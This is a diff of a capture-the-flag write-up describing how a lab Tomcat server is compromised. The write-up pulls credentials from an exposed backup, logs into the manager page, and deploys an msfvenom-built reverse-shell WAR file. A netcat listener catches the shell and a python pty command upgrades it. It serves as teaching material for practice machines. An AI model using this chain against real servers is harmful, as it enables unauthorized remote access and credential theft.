@@ -21,7 +21,7 @@ Port 80 seems to be useless or may require different scan parameters, however po
 ps: Randy may be a log in credential</br>
 
 ## Searching for Exploits
-There is a few interesting directories such as /shell and /manager. before i start looking into the Backup.zip i would like to know what kind of access we have to /manager directory for the tomcat server.
+There is a few interesting directories. Before i start looking into the Backup.zip i would like to know what kind of access we have to /manager directory for the tomcat server.
 ![Alt text](/Images/ManagerLogIn.png?raw=true "Readme.txt")</br>
 Exciting!! it seems we have a location to put stolen credential if we can find them. Once you've tried some default passwords and attempt to log in anonymously (sorry but it most likely wont be that easy) we can shift our focus.
 For now we will focus on the backup.zip.by typing into the browser http://<TargetIPAddress>:8080/backup.zip or using curl in the terminal curl http://<TargetIPAddress>:8080/backup.zip --output <file_name>
@@ -39,9 +39,20 @@ we cat tomcat-users.xml and find something very interesting!
 here i can see a list of usernames we can add to the list, some of which come with passwords.I would keep these usernames somewhere for potential future brute force efforts. Now lets try to log in as admin or manager to the tomcat server using 'melehifokivai' as the password.
 ![Alt text](/Images/ManagerLogInSuccess.png?raw=true "Readme.txt")
 It Worked!</br>
+
 ## Reverse Shell Via .WAR
-The clearest escalation into the system rather than the web facing manager application is through the 'WAR file to deploy' section on the manager page. There are a couple ways we can spawn a reverse shell using a .WAR file however the most convenient method was to use msfvenom.I used the command msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war creating our .WAR file in the directory of the terminal.</br>
-Since this machine is an easy-medium rating i think a reverse shell explanation may be handy. The idea of many reverse shell methods including this one is to upload a file to a server or target machine with the elevated privileges. In this case we upload a .WAR file with the privileged of the admin tomcat user. .WAR files have an executable component which means we can request a bash shell to be sent to our IP on a specific port (in my case, port 4444). 
+Since this machine is an easy-medium rating i think a reverse shell explanation may be handy. The idea of many reverse shell methods including this one is to upload a file to a server or target machine with the elevated privileges. In this case we upload a .WAR file with the privileged of the admin tomcat user. .WAR files have an executable component which means we can request a bash shell to be sent to our IP on a specific port(in my case, port 4444) using bash networking, a functionality allowed from modern bash versions (this is often shown in a reverse shell script with dev/tcp). 
+
+The clearest escalation into the system rather than the web facing manager application is through the 'WAR file to deploy' section on the manager page. There are a couple of ways we can spawn a reverse shell using a .WAR file however the most convenient method is to use msfvenom.</br>
+- I used the command msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war creating our .WAR file in the directory our terminal is in.</br>
+- We can then go to the 'War file to deploy' field and upload our shell.war file we just created
+- using the same port specified in the msfvenom command we will now open a terminal and use net cat to listen to port 4444.
+- now go back to the web browser and type in the name of your file like http://<target_IP>/shell and on your netcat terminal we will have a very unstable terminal!
+
+to complete the reverse shell we need to upgrade our terminal. I usually do the following
+- python3 -c 'import pty;pty.spawn("/bin/bash")' then press Ctrl+Z
+- stty raw -echo;fg then press ENTER twice
+- export TERM=xterm
 
 
 
